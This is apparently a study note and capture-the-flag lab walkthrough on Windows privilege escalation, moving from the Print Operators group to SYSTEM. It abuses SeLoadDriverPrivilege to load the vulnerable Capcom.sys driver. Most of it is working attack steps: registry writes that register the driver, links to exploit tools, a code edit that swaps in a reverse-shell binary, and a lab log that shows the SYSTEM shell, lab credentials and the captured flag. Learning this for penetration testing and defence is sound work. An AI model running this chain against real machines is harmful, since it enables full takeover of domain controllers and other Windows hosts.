# Print Operators

Print Operators is another highly privileged group, which grants its members the SeLoadDriverPrivilege, rights to manage, create, share, and delete printers connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it down. 

## Leverage Print Operators belonging using Capcom

1) Confirming Privileges

```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name           Description                          State
======================== =================================    =======
SeIncreaseQuotaPrivilege Adjust memory quotas for a process   Disabled
SeChangeNotifyPrivilege  Bypass traverse checking             Enabled
SeShutdownPrivilege      Shut down the system                 Disabled
```

2) Checking Privileges Again

open an administrative command shell

```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================  ==========
SeMachineAccountPrivilege     Add workstations to domain           Disabled
SeLoadDriverPrivilege         Load and unload device drivers       Disabled
SeShutdownPrivilege           Shut down the system			       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
```
3) Use the driver Capcom.sys to execute shell

https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp

Adding the include below :

```
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```

4) Compile with cl.exe

```
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp

Microsoft (R) C/C++ Optimizing Compiler Version 19.28.29913 for x86
Copyright (C) Microsoft Corporation.  All rights reserved.

EnableSeLoadDriverPrivilege.cpp
Microsoft (R) Incremental Linker Version 14.28.29913.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:EnableSeLoadDriverPrivilege.exe
EnableSeLoadDriverPrivilege.obj
```

5) Add Reference to Driver

https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys

```
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
The operation completed successfully.
```

```
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

The operation completed successfully.
```

6) Verify Driver is not Loaded

http://www.nirsoft.net/utils/driverview.html

```
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```

7) Verify Privilege is Enabled

```
EnableSeLoadDriverPrivilege.exe

whoami:
INLANEFREIGHT0\printsvc

whoami /priv
SeMachineAccountPrivilege        Disabled
SeLoadDriverPrivilege            Enabled
SeShutdownPrivilege              Disabled
SeChangeNotifyPrivilege          Enabled by default
SeIncreaseWorkingSetPrivilege    Disabled
NTSTATUS: 00000000, WinError: 0
```

8) Verify Capcom Driver is Listed

```
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom

Driver Name           : Capcom.sys
Filename              : C:\Tools\Capcom.sys
```

9) Use ExploitCapcom Tool to Escalate Privileges

```
.\ExploitCapcom.exe

[*] Capcom.sys exploit
[*] Capcom.sys handle was obained as 0000000000000070
[*] Shellcode was placed at 0000024822A50008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
```

--> This launches a shell with SYSTEM privileges.

## Alternate Exploitation - No GUI

If no GUI access :

c:\ProgramData\revshell.exe

```
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```

```
TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```

## Automating the Steps

Automating with EopLoadDriver

https://github.com/TarlogicSecurity/EoPLoadDriver/

```
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-454284637-3659702366-2958135535-1103\System\CurrentControlSet\Capcom
NTSTATUS: c000010e, WinError: 0
```

## Clean-up

Removing Registry Key

```
reg delete HKCU\System\CurrentControlSet\Capcom

Permanently delete the registry key HKEY_CURRENT_USER\System\CurrentControlSet\Capcom (Yes/No)? Yes

The operation completed successfully.
```

## LAB

xfreerdp /v:10.129.43.31 /u:printsvc /p:HTB_@cademy_stdnt!

Run CMD as Administrator

C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeLoadDriverPrivilege         Load and unload device drivers Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


c:\Tools>reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
Value ImagePath exists, overwrite(Yes/No)? Yes
The operation completed successfully.

c:\Tools>reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
Value Type exists, overwrite(Yes/No)? Yes
The operation completed successfully.

PS C:\Tools> .\DriverView.exe /stext drivers.txt
PS C:\Tools> cat drivers.txt | Select-String -pattern Capcom

c:\Tools>EnableSeLoadDriverPrivilege.exe
whoami:
INLANEFREIGHT0\printsvc

whoami /priv
SeMachineAccountPrivilege                         Disabled
SeLoadDriverPrivilege                             Enabled
SeShutdownPrivilege                               Disabled
SeChangeNotifyPrivilege                           Enabled by default
SeIncreaseWorkingSetPrivilege                     Disabled
NTSTATUS: 00000000, WinError: 0

PS C:\Tools> .\DriverView.exe /stext drivers.txt
PS C:\Tools> cat drivers.txt | Select-String -pattern Capcom

Driver Name       : Capcom.sys
Filename          : C:\Tools\Capcom.sys

c:\Tools>.\ExploitCapcom\ExploitCapcom.exe
[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000070
[*] Shellcode was placed at 000001F393330008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
[*] Press any key to exit this program


Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\Tools>type c:\Users\Administrator\Desktop\flag.txt
Pr1nt_0p3rat0rs_ftw!
c:\Tools>